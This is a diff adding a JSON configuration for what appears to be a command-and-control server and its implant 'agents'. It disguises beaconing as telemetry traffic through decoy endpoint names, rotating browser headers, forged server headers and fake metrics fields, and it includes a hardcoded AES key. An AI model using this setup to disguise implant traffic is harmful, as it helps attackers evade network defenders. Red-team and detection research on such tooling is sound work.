@@ -1,0 +1,1332 @@
+{
+  "config": {
+    "aes_key": "mtbN+9GJ5O/QEknWcPfs484Msqh+2vI2T9KUmbvmTps=",
+    "aes_iv": "jwrFJ5Okp4OXpUfes8UFWw=="
+  },
+  "server": {
+    "client_api_base_path": "/api",
+    "agent_base_names": [
+      "venom",
+      "carnage",
+      "riot",
+      "lasher",
+      "agony",
+      "toxin",
+      "scream",
+      "mania",
+      "scorn",
+      "raze",
+      "mayhem",
+      "knull",
+      "symbiote",
+      "kron",
+      "wilde",
+      "flexo",
+      "misery",
+      "silence",
+      "rascal",
+      "shade",
+      "wraith",
+      "phantom",
+      "specter",
+      "ghost",
+      "shadow",
+      "dark",
+      "void",
+      "chaos",
+      "fury",
+      "wrath",
+      "blade",
+      "steel",
+      "iron",
+      "forge",
+      "spark",
+      "flame",
+      "frost",
+      "storm",
+      "thunder",
+      "lightning",
+      "bolt"
+    ],
+    "always_response_headers": [
+      [
+        "X-Powered-By",
+        "PHP/8.2.0"
+      ],
+      [
+        "Content-Type",
+        "application/json; charset=utf-8"
+      ],
+      [
+        "X-XSS-Protection",
+        "1; mode=block"
+      ],
+      [
+        "Cache-Control",
+        "no-cache, private"
+      ]
+    ],
+    "random_response_headers": [
+      [
+        "X-Frame-Options",
+        "SAMEORIGIN"
+      ],
+      [
+        "X-Content-Type-Options",
+        "nosniff"
+      ],
+      [
+        "Referrer-Policy",
+        "strict-origin-when-cross-origin"
+      ],
+      [
+        "Strict-Transport-Security",
+        "max-age=31536000; includeSubDomains"
+      ],
+      [
+        "Access-Control-Allow-Origin",
+        "*"
+      ],
+      [
+        "Access-Control-Allow-Methods",
+        "GET, POST, OPTIONS"
+      ],
+      [
+        "Access-Control-Allow-Headers",
+        "Content-Type, Authorization"
+      ],
+      [
+        "Vary",
+        "Accept-Encoding"
+      ],
+      [
+        "X-RateLimit-Limit",
+        "100"
+      ],
+      [
+        "X-RateLimit-Remaining",
+        "99"
+      ],
+      [
+        "X-RateLimit-Reset",
+        "345600"
+      ]
+    ],
+    "min_random_headers": 3,
+    "max_random_headers": 9,
+    "min_random_json_attributes": 3,
+    "max_random_json_attributes": 14,
+    "random_json_attributes": [
+      {
+        "name": "response_time",
+        "generator": {
+          "type": "uniform",
+          "min": 12.5,
+          "max": 245.8,
+          "round": 2
+        }
+      },
+      {
+        "name": "cpu_usage",
+        "generator": {
+          "type": "uniform",
+          "min": 15.2,
+          "max": 87.3,
+          "round": 1
+        }
+      },
+      {
+        "name": "memory_usage",
+        "generator": {
+          "type": "uniform",
+          "min": 23.1,
+          "max": 94.7,
+          "round": 1
+        }
+      },
+      {
+        "name": "disk_usage",
+        "generator": {
+          "type": "uniform",
+          "min": 45.8,
+          "max": 89.2,
+          "round": 1
+        }
+      },
+      {
+        "name": "network_latency",
+        "generator": {
+          "type": "uniform",
+          "min": 2.1,
+          "max": 156.7,
+          "round": 2
+        }
+      },
+      {
+        "name": "request_count",
+        "generator": {
+          "type": "randint",
+          "min": 1247,
+          "max": 98765
+        }
+      },
+      {
+        "name": "error_rate",
+        "generator": {
+          "type": "uniform",
+          "min": 0.01,
+          "max": 2.34,
+          "round": 3
+        }
+      },
+      {
+        "name": "throughput",
+        "generator": {
+          "type": "uniform",
+          "min": 125.4,
+          "max": 2345.7,
+          "round": 1
+        }
+      },
+      {
+        "name": "aws_region",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "us-east-1",
+            "us-west-2",
+            "eu-west-1",
+            "ap-southeast-1"
+          ]
+        }
+      },
+      {
+        "name": "azure_region",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "East US",
+            "West Europe",
+            "Southeast Asia",
+            "Brazil South"
+          ]
+        }
+      },
+      {
+        "name": "gcp_zone",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "us-central1-a",
+            "europe-west1-b",
+            "asia-east1-a"
+          ]
+        }
+      },
+      {
+        "name": "oracle_region",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "us-ashburn-1",
+            "eu-frankfurt-1",
+            "ap-tokyo-1"
+          ]
+        }
+      },
+      {
+        "name": "instance_type",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "t3.medium",
+            "m5.large",
+            "c5.xlarge",
+            "r5.2xlarge"
+          ]
+        }
+      },
+      {
+        "name": "load_balancer_health",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "healthy",
+            "degraded",
+            "unhealthy"
+          ]
+        }
+      },
+      {
+        "name": "auto_scaling_status",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "in_progress",
+            "stable",
+            "scaling_up",
+            "scaling_down"
+          ]
+        }
+      },
+      {
+        "name": "session_count",
+        "generator": {
+          "type": "randint",
+          "min": 156,
+          "max": 8923
+        }
+      },
+      {
+        "name": "active_users",
+        "generator": {
+          "type": "randint",
+          "min": 23,
+          "max": 1456
+        }
+      },
+      {
+        "name": "database_connections",
+        "generator": {
+          "type": "randint",
+          "min": 5,
+          "max": 89
+        }
+      },
+      {
+        "name": "cache_hit_rate",
+        "generator": {
+          "type": "uniform",
+          "min": 67.2,
+          "max": 98.7,
+          "round": 1
+        }
+      },
+      {
+        "name": "queue_depth",
+        "generator": {
+          "type": "base64_random",
+          "min_length": 20,
+          "max_length": 50
+        }
+      },
+      {
+        "name": "worker_processes",
+        "generator": {
+          "type": "randint",
+          "min": 2,
+          "max": 16
+        }
+      },
+      {
+        "name": "log_level",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "INFO",
+            "DEBUG",
+            "WARN",
+            "ERROR"
+          ]
+        }
+      },
+      {
+        "name": "trace_id",
+        "generator": {
+          "type": "base64_random",
+          "min_length": 20,
+          "max_length": 50
+        }
+      },
+      {
+        "name": "span_id",
+        "generator": {
+          "type": "base64_random",
+          "min_length": 20,
+          "max_length": 50
+        }
+      },
+      {
+        "name": "correlation_id",
+        "generator": {
+          "type": "str_randint",
+          "min": 100000000,
+          "max": 999999999
+        }
+      },
+      {
+        "name": "request_id",
+        "generator": {
+          "type": "str_randint",
+          "min": 100000000,
+          "max": 999999999
+        }
+      },
+      {
+        "name": "timestamp_utc",
+        "generator": {
+          "type": "datetime_utc"
+        }
+      },
+      {
+        "name": "timezone",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "UTC",
+            "America/New_York",
+            "Europe/London",
+            "Asia/Tokyo"
+          ]
+        }
+      },
+      {
+        "name": "user_satisfaction",
+        "generator": {
+          "type": "uniform",
+          "min": 3.2,
+          "max": 4.9,
+          "round": 1
+        }
+      },
+      {
+        "name": "conversion_rate",
+        "generator": {
+          "type": "uniform",
+          "min": 1.2,
+          "max": 8.7,
+          "round": 2
+        }
+      },
+      {
+        "name": "revenue_per_user",
+        "generator": {
+          "type": "uniform",
+          "min": 12.45,
+          "max": 89.67,
+          "round": 2
+        }
+      },
+      {
+        "name": "churn_rate",
+        "generator": {
+          "type": "uniform",
+          "min": 0.5,
+          "max": 3.2,
+          "round": 2
+        }
+      },
+      {
+        "name": "feature_usage",
+        "generator": {
+          "type": "uniform",
+          "min": 15.3,
+          "max": 87.6,
+          "round": 1
+        }
+      },
+      {
+        "name": "health_status",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "healthy",
+            "degraded",
+            "unhealthy"
+          ]
+        }
+      },
+      {
+        "name": "maintenance_mode",
+        "generator": {
+          "type": "choice",
+          "options": [
+            true,
+            false
+          ]
+        }
+      },
+      {
+        "name": "backup_status",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "completed",
+            "in_progress",
+            "failed",
+            "scheduled"
+          ]
+        }
+      },
+      {
+        "name": "ssl_cert_expiry",
+        "generator": {
+          "type": "template",
+          "template": "{days} days",
+          "days": {
+            "type": "randint",
+            "min": 1,
+            "max": 365
+          }
+        }
+      },
+      {
+        "name": "last_restart",
+        "generator": {
+          "type": "template",
+          "template": "{hours} hours ago",
+          "hours": {
+            "type": "randint",
+            "min": 1,
+            "max": 720
+          }
+        }
+      },
+      {
+        "name": "bandwidth_usage",
+        "generator": {
+          "type": "uniform",
+          "min": 12.3,
+          "max": 456.7,
+          "round": 1
+        }
+      },
+      {
+        "name": "packet_loss",
+        "generator": {
+          "type": "uniform",
+          "min": 0.001,
+          "max": 0.5,
+          "round": 3
+        }
+      },
+      {
+        "name": "connection_count",
+        "generator": {
+          "type": "randint",
+          "min": 156,
+          "max": 2345
+        }
+      },
+      {
+        "name": "ssl_handshakes",
+        "generator": {
+          "type": "base64_random",
+          "min_length": 20,
+          "max_length": 50
+        }
+      },
+      {
+        "name": "dns_lookups",
+        "generator": {
+          "type": "randint",
+          "min": 23,
+          "max": 567
+        }
+      },
+      {
+        "name": "failed_logins",
+        "generator": {
+          "type": "randint",
+          "min": 0,
+          "max": 45
+        }
+      },
+      {
+        "name": "blocked_ips",
+        "generator": {
+          "type": "randint",
+          "min": 0,
+          "max": 23
+        }
+      },
+      {
+        "name": "ssl_errors",
+        "generator": {
+          "type": "base64_random",
+          "min_length": 20,
+          "max_length": 50
+        }
+      },
+      {
+        "name": "rate_limit_hits",
+        "generator": {
+          "type": "randint",
+          "min": 0,
+          "max": 89
+        }
+      },
+      {
+        "name": "security_scan_status",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "passed",
+            "failed",
+            "in_progress"
+          ]
+        }
+      },
+      {
+        "name": "random_b64_token",
+        "generator": {
+          "type": "base64_random",
+          "min_length": 20,
+          "max_length": 50
+        }
+      }
+    ]
+  },
+  "agent": {
+    "debug": true,
+    "server_host": "localhost",
+    "server_port": 5000,
+    "server_scheme": "http",
+    "proxy_host": "127.0.0.1",
+    "proxy_port": "8080",
+    "use_proxy": false,
+    "agent_api_base_paths": [
+      "/api/v2.847/8f3e9c1a6b4d7e2f91a5c8b3e6d9f2a4",
+      "/api/v1.193/a5c8f2e1b9d6a3c7f4e8b2d5a9c6f3e1",
+      "/api/v3.756/c2a9f6e3d1b8c5f2e9a6d3b8f5c2e9a6",
+      "/api/v4.082/e7b4d1a8f5c2e9b6d3a8f5c2b9e6d3a8",
+      "/api/v1.649/f9c6b3e1d8a5f2c9b6e3d1a8f5c2b9e6",
+      "/api/v5.321/b8e5a2d9f6c3b1e8a5d2f9c6b3e1a8d5",
+      "/api/v2.574/d6f3c1b9e7a4d2f8c5b1e9a6d3f1c8b5",
+      "/api/v6.918/a3e8d5b2f9c7a4e1d8b5f2c9a6e3d1b8",
+      "/api/v3.465/c7b4f1e9d6a3c1f8b5e2d9a6c3f1b8e5",
+      "/api/v1.892/e4d1a8f6c3b1e9d7a4f2c8b5e3d1a9f6",
+      "/api/v4.736/f2c9b7e4d1a9f6c4b2e8d5a3f1c9b7e4",
+      "/api/v2.051/a8f5c2b9e7d4a2f9c6b4e1d8a5c3f2b9",
+      "/api/v5.683/b1e9d6a4c2f8b6e3d1a9c7f4b2e9d6a4",
+      "/api/v3.247/c9f6b4e2d8a5c3f1b9e7d4a2c8f6b4e2",
+      "/api/v6.512/d7a4f2c9b7e5d3a1f8c6b4e2d9a7c5f3",
+      "/api/v1.974/e5c3a1f9d7b5e4c2a9f7d5b3e1c9a7f5",
+      "/api/v4.138/f3b1e8d6a4c3f1b9e8d6a4c2f1b9e8d6",
+      "/api/v2.896/a1f8c6b4e3d2a9f7c5b4e3d2a1f8c6b5",
+      "/api/v5.425/b9e7d5a3c2f1b8e7d5a3c2f1b9e7d5a4",
+      "/api/v3.681/c7f5b3e2d1a9c8f6b4e3d2a1c9f7b5e3"
+    ],
+    "uri_endpoints": {
+      "agent/register": [
+        "telemetry/collect",
+        "metrics/upload",
+        "analytics/data",
+        "monitoring/heartbeat",
+        "insights/register",
+        "observability/agent",
+        "diagnostics/init",
+        "profiling/start"
+      ],
+      "agent/poll": [
+        "telemetry/poll",
+        "metrics/check",
+        "analytics/query",
+        "monitoring/status",
+        "insights/fetch",
+        "observability/collect",
+        "diagnostics/update",
+        "profiling/sample"
+      ],
+      "agent/result": [
+        "telemetry/submit",
+        "metrics/report",
+        "analytics/upload",
+        "monitoring/result",
+        "insights/process",
+        "observability/event",
+        "diagnostics/complete",
+        "profiling/end"
+      ],
+      "agent/checkin": [
+        "telemetry/heartbeat",
+        "metrics/status",
+        "analytics/ping",
+        "monitoring/checkin",
+        "insights/update",
+        "observability/health",
+        "diagnostics/heartbeat",
+        "profiling/status"
+      ]
+    },
+    "data_field_names": [
+      "session_token",
+      "hash",
+      "state_key",
+      "nonce",
+      "validation",
+      "session_id",
+      "state",
+      "token_data",
+      "hash_params",
+      "cipher_key",
+      "token",
+      "auth_config",
+      "session_meta",
+      "security_info",
+      "auth_details",
+      "token_specs",
+      "soptions"
+    ],
+    "user_agents": [
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+      "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
+      "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
+      "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+      "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
+      "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+      "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
+      "Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
+    ],
+    "random_headers": [
+      [
+        "Accept-Language",
+        "en-US,en;q=0.9"
+      ],
+      [
+        "Accept-Language",
+        "en-GB,en;q=0.9"
+      ],
+      [
+        "Accept-Language",
+        "en-CA,en;q=0.9"
+      ],
+      [
+        "Accept-Language",
+        "en-AU,en;q=0.9"
+      ],
+      [
+        "Accept-Language",
+        "de-DE,de;q=0.9,en;q=0.8"
+      ],
+      [
+        "Accept-Language",
+        "fr-FR,fr;q=0.9,en;q=0.8"
+      ],
+      [
+        "Accept-Language",
+        "es-ES,es;q=0.9,en;q=0.8"
+      ],
+      [
+        "Accept-Language",
+        "it-IT,it;q=0.9,en;q=0.8"
+      ],
+      [
+        "Accept-Language",
+        "pt-BR,pt;q=0.9,en;q=0.8"
+      ],
+      [
+        "Accept-Language",
+        "ru-RU,ru;q=0.9,en;q=0.8"
+      ],
+      [
+        "Accept-Language",
+        "nl-NL,nl;q=0.9,en;q=0.8"
+      ],
+      [
+        "Accept-Language",
+        "sv-SE,sv;q=0.9,en;q=0.8"
+      ],
+      [
+        "Accept-Language",
+        "no-NO,no;q=0.9,en;q=0.8"
+      ],
+      [
+        "Accept-Language",
+        "da-DK,da;q=0.9,en;q=0.8"
+      ],
+      [
+        "Accept-Language",
+        "fi-FI,fi;q=0.9,en;q=0.8"
+      ],
+      [
+        "Accept",
+        "application/json, text/plain, */*"
+      ],
+      [
+        "Accept",
+        "*/*"
+      ],
+      [
+        "Accept",
+        "application/json"
+      ],
+      [
+        "Accept-Encoding",
+        "gzip, deflate, br"
+      ],
+      [
+        "Accept-Encoding",
+        "gzip, deflate"
+      ],
+      [
+        "Cache-Control",
+        "no-cache"
+      ],
+      [
+        "Cache-Control",
+        "max-age=0"
+      ],
+      [
+        "Cache-Control",
+        "private"
+      ],
+      [
+        "Pragma",
+        "no-cache"
+      ],
+      [
+        "Sec-Fetch-Dest",
+        "empty"
+      ],
+      [
+        "Sec-Fetch-Mode",
+        "cors"
+      ],
+      [
+        "Sec-Fetch-Site",
+        "cross-site"
+      ],
+      [
+        "Sec-Fetch-User",
+        "?1"
+      ],
+      [
+        "Sec-Ch-Ua",
+        "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\""
+      ],
+      [
+        "Sec-Ch-Ua",
+        "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"119\", \"Google Chrome\";v=\"119\""
+      ],
+      [
+        "Sec-Ch-Ua",
+        "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"118\", \"Google Chrome\";v=\"118\""
+      ],
+      [
+        "Sec-Ch-Ua",
+        "\"Not_A Brand\";v=\"99\", \"Microsoft Edge\";v=\"120\", \"Chromium\";v=\"120\""
+      ],
+      [
+        "Sec-Ch-Ua",
+        "\"Not_A Brand\";v=\"99\", \"Microsoft Edge\";v=\"119\", \"Chromium\";v=\"119\""
+      ],
+      [
+        "Sec-Ch-Ua",
+        "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Opera\";v=\"106\""
+      ],
+      [
+        "Sec-Ch-Ua",
+        "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"119\", \"Opera\";v=\"105\""
+      ],
+      [
+        "Sec-Ch-Ua-Mobile",
+        "?0"
+      ],
+      [
+        "Sec-Ch-Ua-Platform",
+        "\"Linux\""
+      ],
+      [
+        "Upgrade-Insecure-Requests",
+        "1"
+      ],
+      [
+        "Connection",
+        "keep-alive"
+      ],
+      [
+        "DNT",
+        "1"
+      ],
+      [
+        "DNT",
+        "0"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Type",
+        "application/json; charset=utf-8"
+      ]
+    ],
+    "random_json_attributes": [
+      {
+        "name": "response_time",
+        "generator": {
+          "type": "uniform",
+          "min": 12.5,
+          "max": 245.8,
+          "round": 2
+        }
+      },
+      {
+        "name": "cpu_usage",
+        "generator": {
+          "type": "uniform",
+          "min": 15.2,
+          "max": 87.3,
+          "round": 1
+        }
+      },
+      {
+        "name": "memory_usage",
+        "generator": {
+          "type": "uniform",
+          "min": 23.1,
+          "max": 94.7,
+          "round": 1
+        }
+      },
+      {
+        "name": "disk_usage",
+        "generator": {
+          "type": "uniform",
+          "min": 45.8,
+          "max": 89.2,
+          "round": 1
+        }
+      },
+      {
+        "name": "network_latency",
+        "generator": {
+          "type": "uniform",
+          "min": 2.1,
+          "max": 156.7,
+          "round": 2
+        }
+      },
+      {
+        "name": "request_count",
+        "generator": {
+          "type": "randint",
+          "min": 1247,
+          "max": 98765
+        }
+      },
+      {
+        "name": "error_rate",
+        "generator": {
+          "type": "uniform",
+          "min": 0.01,
+          "max": 2.34,
+          "round": 3
+        }
+      },
+      {
+        "name": "throughput",
+        "generator": {
+          "type": "uniform",
+          "min": 125.4,
+          "max": 2345.7,
+          "round": 1
+        }
+      },
+      {
+        "name": "aws_region",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "us-east-1",
+            "us-west-2",
+            "eu-west-1",
+            "ap-southeast-1"
+          ]
+        }
+      },
+      {
+        "name": "azure_region",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "East US",
+            "West Europe",
+            "Southeast Asia",
+            "Brazil South"
+          ]
+        }
+      },
+      {
+        "name": "gcp_zone",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "us-central1-a",
+            "europe-west1-b",
+            "asia-east1-a"
+          ]
+        }
+      },
+      {
+        "name": "oracle_region",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "us-ashburn-1",
+            "eu-frankfurt-1",
+            "ap-tokyo-1"
+          ]
+        }
+      },
+      {
+        "name": "instance_type",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "t3.medium",
+            "m5.large",
+            "c5.xlarge",
+            "r5.2xlarge"
+          ]
+        }
+      },
+      {
+        "name": "load_balancer_health",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "healthy",
+            "degraded",
+            "unhealthy"
+          ]
+        }
+      },
+      {
+        "name": "auto_scaling_status",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "in_progress",
+            "stable",
+            "scaling_up",
+            "scaling_down"
+          ]
+        }
+      },
+      {
+        "name": "session_count",
+        "generator": {
+          "type": "randint",
+          "min": 156,
+          "max": 8923
+        }
+      },
+      {
+        "name": "active_users",
+        "generator": {
+          "type": "randint",
+          "min": 23,
+          "max": 1456
+        }
+      },
+      {
+        "name": "database_connections",
+        "generator": {
+          "type": "randint",
+          "min": 5,
+          "max": 89
+        }
+      },
+      {
+        "name": "cache_hit_rate",
+        "generator": {
+          "type": "uniform",
+          "min": 67.2,
+          "max": 98.7,
+          "round": 1
+        }
+      },
+      {
+        "name": "queue_depth",
+        "generator": {
+          "type": "randint",
+          "min": 0,
+          "max": 234
+        }
+      },
+      {
+        "name": "worker_processes",
+        "generator": {
+          "type": "randint",
+          "min": 2,
+          "max": 16
+        }
+      },
+      {
+        "name": "log_level",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "INFO",
+            "DEBUG",
+            "WARN",
+            "ERROR"
+          ]
+        }
+      },
+      {
+        "name": "trace_id",
+        "generator": {
+          "type": "base64_random",
+          "min_length": 20,
+          "max_length": 50
+        }
+      },
+      {
+        "name": "span_id",
+        "generator": {
+          "type": "str_randint",
+          "min": 1000000,
+          "max": 9999999
+        }
+      },
+      {
+        "name": "correlation_id",
+        "generator": {
+          "type": "str_randint",
+          "min": 100000000,
+          "max": 999999999
+        }
+      },
+      {
+        "name": "request_id",
+        "generator": {
+          "type": "base64_random",
+          "min_length": 20,
+          "max_length": 50
+        }
+      },
+      {
+        "name": "timestamp_utc",
+        "generator": {
+          "type": "datetime_utc"
+        }
+      },
+      {
+        "name": "timezone",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "UTC",
+            "America/New_York",
+            "Europe/London",
+            "Asia/Tokyo"
+          ]
+        }
+      },
+      {
+        "name": "user_satisfaction",
+        "generator": {
+          "type": "uniform",
+          "min": 3.2,
+          "max": 4.9,
+          "round": 1
+        }
+      },
+      {
+        "name": "conversion_rate",
+        "generator": {
+          "type": "uniform",
+          "min": 1.2,
+          "max": 8.7,
+          "round": 2
+        }
+      },
+      {
+        "name": "revenue_per_user",
+        "generator": {
+          "type": "uniform",
+          "min": 12.45,
+          "max": 89.67,
+          "round": 2
+        }
+      },
+      {
+        "name": "churn_rate",
+        "generator": {
+          "type": "uniform",
+          "min": 0.5,
+          "max": 3.2,
+          "round": 2
+        }
+      },
+      {
+        "name": "feature_usage",
+        "generator": {
+          "type": "uniform",
+          "min": 15.3,
+          "max": 87.6,
+          "round": 1
+        }
+      },
+      {
+        "name": "health_status",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "healthy",
+            "degraded",
+            "unhealthy"
+          ]
+        }
+      },
+      {
+        "name": "maintenance_mode",
+        "generator": {
+          "type": "choice",
+          "options": [
+            true,
+            false
+          ]
+        }
+      },
+      {
+        "name": "backup_status",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "completed",
+            "in_progress",
+            "failed",
+            "scheduled"
+          ]
+        }
+      },
+      {
+        "name": "ssl_cert_expiry",
+        "generator": {
+          "type": "template",
+          "template": "{days} days",
+          "days": {
+            "type": "randint",
+            "min": 1,
+            "max": 365
+          }
+        }
+      },
+      {
+        "name": "last_restart",
+        "generator": {
+          "type": "template",
+          "template": "{hours} hours ago",
+          "hours": {
+            "type": "randint",
+            "min": 1,
+            "max": 720
+          }
+        }
+      },
+      {
+        "name": "bandwidth_usage",
+        "generator": {
+          "type": "uniform",
+          "min": 12.3,
+          "max": 456.7,
+          "round": 1
+        }
+      },
+      {
+        "name": "packet_loss",
+        "generator": {
+          "type": "base64_random",
+          "min_length": 20,
+          "max_length": 50
+        }
+      },
+      {
+        "name": "connection_count",
+        "generator": {
+          "type": "randint",
+          "min": 156,
+          "max": 2345
+        }
+      },
+      {
+        "name": "ssl_handshakes",
+        "generator": {
+          "type": "randint",
+          "min": 89,
+          "max": 1234
+        }
+      },
+      {
+        "name": "dns_lookups",
+        "generator": {
+          "type": "base64_random",
+          "min_length": 20,
+          "max_length": 50
+        }
+      },
+      {
+        "name": "failed_logins",
+        "generator": {
+          "type": "randint",
+          "min": 0,
+          "max": 45
+        }
+      },
+      {
+        "name": "blocked_ips",
+        "generator": {
+          "type": "base64_random",
+          "min_length": 20,
+          "max_length": 50
+        }
+      },
+      {
+        "name": "ssl_errors",
+        "generator": {
+          "type": "randint",
+          "min": 0,
+          "max": 12
+        }
+      },
+      {
+        "name": "rate_limit_hits",
+        "generator": {
+          "type": "randint",
+          "min": 0,
+          "max": 89
+        }
+      },
+      {
+        "name": "security_scan_status",
+        "generator": {
+          "type": "choice",
+          "options": [
+            "passed",
+            "failed",
+            "in_progress"
+          ]
+        }
+      },
+      {
+        "name": "random_b64_token",
+        "generator": {
+          "type": "base64_random",
+          "min_length": 20,
+          "max_length": 50
+        }
+      }
+    ],
+    "min_random_json_attributes": 4,
+    "max_random_json_attributes": 14
+  }
+}
